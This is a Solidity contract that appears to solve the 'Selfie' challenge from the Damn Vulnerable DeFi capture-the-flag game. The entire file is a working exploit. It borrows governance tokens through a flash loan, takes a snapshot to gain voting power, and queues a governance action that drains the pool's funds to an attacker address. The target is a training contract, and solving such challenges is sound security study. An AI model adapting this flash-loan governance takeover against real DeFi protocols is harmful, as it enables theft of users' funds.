// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {

    ERC20Snapshot public token;
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    address payable attacker;
    uint256 public actionId;

    constructor (address tokenAddress, address poolAddress, address governanceAddress, address attackerAddress) {
        token = ERC20Snapshot(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        attacker = payable(attackerAddress);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    // Take the max amount of flash loan from the pool, take governance over, queue an action that drains all funds
    // from the pool, advance 2 days in time, execute action
    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot governanceToken = DamnValuableTokenSnapshot(tokenAddress);
        governanceToken.snapshot();
        actionId = governance.queueAction(address(pool), abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
            ), 0);
        token.transfer(msg.sender, amount);
    }

    receive() external payable {}
}
